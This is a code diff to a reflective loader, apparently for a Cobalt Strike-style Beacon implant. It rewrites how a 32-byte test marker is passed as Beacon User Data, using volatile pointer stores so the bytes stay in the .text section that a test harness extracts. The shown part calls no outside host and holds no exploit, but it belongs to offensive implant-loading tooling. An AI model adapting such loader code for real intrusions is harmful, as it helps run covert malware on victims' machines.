@@ -553,48 +553,50 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
 #if defined(BW_UDRL_USER_DATA_DELIVER)
     /* 4.9 Beacon User Data: deliver a 32-byte custom buffer with reason
      * 0x0d BEFORE the standard PROCESS_ATTACH - the official contract.
-     * The payload is written as per-byte IMMEDIATE stores: the harness
-     * extract_reflective_loader carries only the .text section, so any
-     * .rdata string literal would be dropped at bake time (observed: the
-     * marker vanished from the generated exe). Immediates travel with
-     * the code. Build with /DBW_UDRL_USER_DATA_DELIVER=1 to enable. */
+     * Stores go through a VOLATILE pointer: the harness loader bake
+     * carries only the .text section, so the compiler must keep every
+     * byte as an immediate store - left free it vectorizes into XMM
+     * constants in .rdata (observed: __xmm@... unknown symbols, 0-byte
+     * extraction). Build with /DBW_UDRL_USER_DATA_DELIVER=1. */
     {
         struct { unsigned int length; unsigned int version; void *syscalls; char custom[32]; } ud;
+        volatile char * dst;
         ud.length = (unsigned int)sizeof(ud);
         ud.version = 1;
         ud.syscalls = NULL;
-        ud.custom[0] = 'P';
-        ud.custom[1] = '3';
-        ud.custom[2] = 'U';
-        ud.custom[3] = 'D';
-        ud.custom[4] = '0';
-        ud.custom[5] = '1';
-        ud.custom[6] = '2';
-        ud.custom[7] = '3';
-        ud.custom[8] = '4';
-        ud.custom[9] = '5';
-        ud.custom[10] = '6';
-        ud.custom[11] = '7';
-        ud.custom[12] = '8';
-        ud.custom[13] = '9';
-        ud.custom[14] = 'A';
-        ud.custom[15] = 'B';
-        ud.custom[16] = 'C';
-        ud.custom[17] = 'D';
-        ud.custom[18] = 'E';
-        ud.custom[19] = 'F';
-        ud.custom[20] = 'G';
-        ud.custom[21] = 'H';
-        ud.custom[22] = 'I';
-        ud.custom[23] = 'J';
-        ud.custom[24] = 'K';
-        ud.custom[25] = 'L';
-        ud.custom[26] = 'M';
-        ud.custom[27] = 'N';
-        ud.custom[28] = 'O';
-        ud.custom[29] = 'P';
-        ud.custom[30] = 'X';
-        ud.custom[31] = 'Y';
+        dst = ud.custom;
+        *dst++ = 'P';
+        *dst++ = '3';
+        *dst++ = 'U';
+        *dst++ = 'D';
+        *dst++ = '0';
+        *dst++ = '1';
+        *dst++ = '2';
+        *dst++ = '3';
+        *dst++ = '4';
+        *dst++ = '5';
+        *dst++ = '6';
+        *dst++ = '7';
+        *dst++ = '8';
+        *dst++ = '9';
+        *dst++ = 'A';
+        *dst++ = 'B';
+        *dst++ = 'C';
+        *dst++ = 'D';
+        *dst++ = 'E';
+        *dst++ = 'F';
+        *dst++ = 'G';
+        *dst++ = 'H';
+        *dst++ = 'I';
+        *dst++ = 'J';
+        *dst++ = 'K';
+        *dst++ = 'L';
+        *dst++ = 'M';
+        *dst++ = 'N';
+        *dst++ = 'O';
+        *dst++ = 'P';
+        *dst++ = 'X';
+        *dst++ = 'Y';
         dllmain((void *)sc_base, 0x0d, &ud);
     }
 #endif
